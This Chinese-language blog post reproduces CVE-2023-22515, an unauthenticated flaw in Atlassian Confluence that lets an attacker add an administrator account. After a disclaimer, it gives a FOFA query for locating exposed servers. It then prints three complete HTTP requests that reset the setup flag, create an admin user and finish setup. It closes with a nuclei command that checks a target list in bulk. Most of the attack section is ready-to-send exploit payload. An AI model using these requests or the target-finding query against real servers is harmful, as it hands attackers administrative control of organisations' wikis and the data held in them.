# 原创
：  漏洞复现--Confluence未授权管理用户添加 (CVE-2023-22515)

# 漏洞复现--Confluence未授权管理用户添加 (CVE-2023-22515)

## 免责声明：

**文章中涉及的漏洞均已修复，敏感信息均已做打码处理，文章仅做经验分享用途，切勿当真，未授权的攻击属于非法行为！文章中敏感信息均已做多层打马处理。传播、利用本文章所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任，一旦造成后果请自行负**

### 一：漏洞描述

Atlassian Confluence是企业广泛使用的wiki系统。<br/> 2023年10月4日，Atlassian官方发布了对于CVE-2023-22515漏洞的补丁。这个漏洞是由属性覆盖导致，利用该漏洞攻击者可以重新执行Confluence安装流程并增加管理员账户。

### 二：漏洞影响版本

version&gt;8.0.0

### 三：网络空间测绘查询

fofa:<br/> `app="ATLASSIAN-Confluence"`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/4eef4a998c66c2da3fa1caf610a8eec6.jpeg"/>

### 四：漏洞复现

POC:<br/> 先覆盖目标Confluence服务器中的bootstrapStatusProvider.applicationConfig.setupComplete属性：

```
GET /server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false HTTP/1.1
Host: IP:PORT
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36
Connection: close
Cache-Control: max-age=0

```

然后新建管理员账户：

```
POST /setup/setupadministrator.action HTTP/1.1
Host: IP:PORT
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 110
X-Atlassian-Token: no-check

username=tbssec&amp;fullName=tbssec&amp;email=admin%40tbssec.com&amp;password=tbssec&amp;confirm=tbssec&amp;setup-next-button=Next

```

接着完成安装请求：

```
POST /setup/finishsetup.action HTTP/1.1
Host: IP:PORT
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
X-Atlassian-Token: no-check

```

<img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/31638a0d567b130b981897a072345e30.jpeg"/><br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/2d2cb738b3dc4322fe66f3b70acda872.jpeg"/><br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/a0d89b5cd4e04eb6b8bde10fbf6b75af.jpeg"/><br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/40e3b29b8faedbf3d4a9ca0919b6410d.jpeg"/><br/> 此时用户已经创建完毕，登录<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/b11890d0bc2047b4086e166a0fdc13fe.jpeg"/>

### 五：批量验证

nuclei已上线该yaml (CVE-2023-22515)<br/> `.\nuclei.exe -t /http/cves/2023/CVE-2023-22515.yaml -l .\Confluence.txt -stats`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/91c17da1c2cddb2942bbb475fb115dd4.jpeg"/>
